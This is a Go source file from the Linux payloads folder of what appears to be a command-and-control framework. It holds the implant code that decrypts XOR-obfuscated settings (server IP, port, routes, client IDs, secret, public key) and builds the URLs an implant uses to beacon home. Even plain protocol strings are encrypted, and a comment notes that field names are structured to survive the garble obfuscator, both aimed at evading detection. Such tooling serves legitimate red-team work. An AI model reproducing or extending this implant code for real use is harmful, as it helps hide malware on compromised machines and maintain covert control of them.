// server/docker/payloads/Linux/getEnv.go

//go:build linux
// +build linux

package main

import (
	"encoding/base64"
	"fmt"
	"strings"
)

// ResolvedConfig holds all decrypted configuration values
// Using a struct instead of map[string]string because garble obfuscates struct field names
type ResolvedConfig struct {
	UserAgent              string
	ContentType            string
	CustomHeaders          string
	GetRoute               string
	PostRoute              string
	GetMethod              string
	PostMethod             string
	GetClientIDName        string
	GetClientIDFormat      string
	PostClientIDName       string
	PostClientIDFormat     string
	PostSecretName         string
	PostSecretFormat       string
	PublicKey              string
	Secret                 string
	Protocol               string
	IP                     string
	Port                   string
	GetClientIDTransforms  string
	PostClientIDTransforms string
	PostDataTransforms     string
	ResponseDataTransforms string
}

// HTTP protocol strings - injected at build time (XOR encrypted)
var (
	geMethodGet      string // GET
	geMethodPost     string // POST
	geProtoHttps     string // https
	geProtoHttp      string // http
	gePort443        string // 443
	gePort80         string // 80
	geFmtUrlNoPort   string // %s://%s
	geFmtUrlWithPort string // %s://%s:%s
	geFmtUrlQuery    string // %s%s?%s=%s
	geSlash          string // /
)

func init() {
	initJSONFields()
}

func secVal(enc string) string {
	v, _ := cfgDec(enc, cfgKey)
	return v
}

func cfgDec(encoded, key string) (string, error) {
	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	var result []byte
	for i := 0; i < len(decoded); i++ {
		result = append(result, decoded[i]^key[i%len(key)])
	}

	return string(result), nil
}

func decryptAllValues() *ResolvedConfig {
	cfg := &ResolvedConfig{}

	cfg.UserAgent, _ = cfgDec(userAgent, cfgKey)
	cfg.ContentType, _ = cfgDec(contentType, cfgKey)
	cfg.CustomHeaders, _ = cfgDec(customHeaders, cfgKey)
	cfg.GetRoute, _ = cfgDec(getRoute, cfgKey)
	cfg.PostRoute, _ = cfgDec(postRoute, cfgKey)
	cfg.GetMethod, _ = cfgDec(getMethod, cfgKey)
	cfg.PostMethod, _ = cfgDec(postMethod, cfgKey)
	cfg.GetClientIDName, _ = cfgDec(getClientIDName, cfgKey)
	cfg.GetClientIDFormat, _ = cfgDec(getClientIDFormat, cfgKey)
	cfg.PostClientIDName, _ = cfgDec(postClientIDName, cfgKey)
	cfg.PostClientIDFormat, _ = cfgDec(postClientIDFormat, cfgKey)
	cfg.PostSecretName, _ = cfgDec(postSecretName, cfgKey)
	cfg.PostSecretFormat, _ = cfgDec(postSecretFormat, cfgKey)
	cfg.PublicKey, _ = cfgDec(publicKey, cfgKey)
	cfg.Secret, _ = cfgDec(secret, cfgKey)
	cfg.Protocol, _ = cfgDec(protocol, cfgKey)
	cfg.IP, _ = cfgDec(ip, cfgKey)
	cfg.Port, _ = cfgDec(port, cfgKey)
	cfg.GetClientIDTransforms, _ = cfgDec(getClientIDTransforms, cfgKey)
	cfg.PostClientIDTransforms, _ = cfgDec(postClientIDTransforms, cfgKey)
	cfg.PostDataTransforms, _ = cfgDec(postDataTransforms, cfgKey)
	cfg.ResponseDataTransforms, _ = cfgDec(responseDataTransforms, cfgKey)

	// Set defaults for HTTP methods if they're empty
	if cfg.GetMethod == "" {
		cfg.GetMethod = secVal(geMethodGet)
	}
	if cfg.PostMethod == "" {
		cfg.PostMethod = secVal(geMethodPost)
	}

	return cfg
}

// buildBaseURL constructs the base URL using protocol, IP and port
func buildBaseURL(proto, ipAddr, portNum string) string {
	proto = strings.ToLower(proto)

	// Check if we should omit the port for standard HTTP/HTTPS ports
	if (proto == secVal(geProtoHttps) && portNum == secVal(gePort443)) || (proto == secVal(geProtoHttp) && portNum == secVal(gePort80)) {
		return fmt.Sprintf(secVal(geFmtUrlNoPort), proto, ipAddr)
	}

	return fmt.Sprintf(secVal(geFmtUrlWithPort), proto, ipAddr, portNum)
}

// buildGetURL constructs the complete GET URL
func buildGetURL(baseURL, getRouteVal, clientIDName string, clientIDVal string) string {
	s := secVal(geSlash)
	if !strings.HasPrefix(getRouteVal, s) {
		getRouteVal = s + getRouteVal
	}

	return fmt.Sprintf(secVal(geFmtUrlQuery), baseURL, getRouteVal, clientIDName, clientIDVal)
}

// buildPostURL constructs the complete POST URL
func buildPostURL(baseURL, postRouteVal, clientIDName string, clientIDVal string) string {
	s := secVal(geSlash)
	if !strings.HasPrefix(postRouteVal, s) {
		postRouteVal = s + postRouteVal
	}

	return fmt.Sprintf(secVal(geFmtUrlQuery), baseURL, postRouteVal, clientIDName, clientIDVal)
}
